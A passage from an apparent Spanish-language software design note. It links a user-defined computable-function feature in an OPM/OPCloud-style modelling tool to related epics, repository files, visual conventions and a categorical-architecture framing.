- Evidencia OPCloud: `JOYAS.md`, `sandbox-data/`, `decompiled/`.
- Hermanos simulacion: **EPICA-B0** (simulation-conceptual), **EPICA-B1** (simulation-computational predefinida), **EPICA-B3** (range-validation), **EPICA-B4** (conditions/loops), **EPICA-B5** (user-input).
- Epicas que habilitan esta: **EPICA-A0** (stereotypes — `<<Point>>`), **EPICA-10** (creacion de cosas), **EPICA-11** (modelado basico — enlaces instrumento), **EPICA-1B** (bring connected).
- Epicas que dependen de esta: **EPICA-B4** (conditions con funciones), **EPICA-B5** (user input como entrada de funciones).
- Invariantes del repo: `src/nucleo/tipos.ts` (extender `Process` con `computation` y `body`); `src/nucleo/validacion/` (sintaxis y runtime error); `src/render/opl-renderer.ts` (verbalizacion de alias, NO del body — confirmado §7); `src/render/jointjs/` (sufijo ``, casilla oliva); `src/persistencia/` (serializacion de body, historial).
- SSOT visual: parentesis `` como marca canonica de proceso computable (§9 doc fuente + convencion heredada de Advance 3); casilla oliva/dorada como slot runtime.
- SSOT OPM: el alias como mediador sintactico entre nombre OPM (legible) y codigo (identificador) NO esta en la SSOT estandar Dori — es convencion OPCloud. Registrar en `docs/design/` si se adopta.
- Arquitectura categorica: la funcion definida por usuario es un **morfismo** en la categoria de procesos computables que extiende la estructura del kernel. Formalizacion candidata en `docs/ARQUITECTURA-CATEGORICA.md` como ecuacion `E-B2` si se integra al marco categorico.
